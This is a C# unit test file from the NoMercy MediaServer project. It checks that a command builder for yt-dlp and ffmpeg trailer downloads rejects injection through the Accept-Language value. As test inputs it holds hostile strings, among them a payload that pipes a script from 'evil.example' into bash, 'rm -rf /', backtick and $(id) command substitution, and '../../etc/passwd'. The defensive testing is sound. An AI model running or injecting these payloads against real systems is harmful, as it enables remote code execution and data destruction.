// -----------------------------------------------------------------------------
//  Copyright (c) 2024-present NoMercy Entertainment. All rights reserved.
//
//  This file is part of NoMercy MediaServer, source-available software (NOT open
//  source). Personal use and contributions are welcome; distribution, resale,
//  relicensing, and commercial exploitation are prohibited without explicit
//  written consent. See LICENSE for full terms. Distributed WITHOUT ANY WARRANTY.
//
//  SPDX-License-Identifier: LicenseRef-NoMercy-Proprietary
// -----------------------------------------------------------------------------

using NoMercy.Api.Controllers.V1.Media;
using NoMercy.Encoder.Trailers;
using Xunit;

namespace NoMercy.Tests.Api.Media;

public class TrailerCommandBuilderTests
{
    private const string Ytdlp = "/opt/yt-dlp";
    private const string Ffmpeg = "/opt/ffmpeg";
    private const string TrailerId = "dQw4w9WgXcQ";

    [Fact]
    public void Build_MaliciousAcceptLanguage_IsNotInterpolatedIntoTheCommand()
    {
        // The exact shape BaseController.Language() can produce from a crafted
        // Accept-Language header (it only splits on '_', so this reaches Build intact).
        string payload = "en\"; curl http://evil.example/x.sh | bash #";

        string command = TrailerCommandBuilder.Build(Ytdlp, Ffmpeg, TrailerId, payload);

        command.Should().NotContain("evil.example");
        command.Should().NotContain("curl");
        command.Should().NotContain(payload);
        // The subtitle argument is dropped entirely for an unsafe language.
        command.Should().NotContain("--write-subs");
        // ...but the trailer still fetches.
        command.Should().Contain(TrailerId);
        command.Should().Contain($"| {Ffmpeg}");
    }

    [Theory]
    [InlineData("en")]
    [InlineData("en-US")]
    [InlineData("pt-BR")]
    [InlineData("zh-Hans")]
    public void Build_SafeLocale_IncludesSubtitleArgument(string language)
    {
        string command = TrailerCommandBuilder.Build(Ytdlp, Ffmpeg, TrailerId, language);

        command
            .Should()
            .Contain($" -o \"subtitle:{language}.%(ext)s\" --sub-langs all --write-subs ");
    }

    [Theory]
    [InlineData("")]
    [InlineData(null)]
    [InlineData("en; rm -rf /")]
    [InlineData("en`id`")]
    [InlineData("$(id)")]
    [InlineData("../../etc/passwd")]
    [InlineData("en US")]
    public void Build_UnsafeOrEmptyLanguage_OmitsSubtitleArgument(string? language)
    {
        string command = TrailerCommandBuilder.Build(Ytdlp, Ffmpeg, TrailerId, language);

        command.Should().NotContain("--write-subs");
        command.Should().NotContain("subtitle:");
    }

    [Fact]
    public void Build_AlwaysContainsCorePipeline()
    {
        string command = TrailerCommandBuilder.Build(Ytdlp, Ffmpeg, TrailerId, "en");

        command.Should().StartWith(Ytdlp);
        command.Should().Contain(TrailerId);
        command.Should().Contain($"| {Ffmpeg} -i pipe:");
        command.Should().Contain("video.m3u8");
    }

    [Theory]
    [InlineData(["en", true])]
    [InlineData(["EN", true])]
    [InlineData(["en-US", true])]
    [InlineData(["pt-BR", true])]
    [InlineData(["zh-Hans", true])]
    [InlineData([null, false])]
    [InlineData(["", false])]
    [InlineData(["a", false])]
    [InlineData(["english", false])]
    [InlineData(["en_US", false])]
    [InlineData(["en ", false])]
    [InlineData(["en\"", false])]
    [InlineData(["en;ls", false])]
    [InlineData(["$(id)", false])]
    [InlineData(["`id`", false])]
    [InlineData(["../x", false])]
    public void IsSafeLanguage_MatchesOnlyLocaleTokens(string? language, bool expected)
    {
        TrailerCommandBuilder.IsSafeLanguage(language).Should().Be(expected);
    }
}
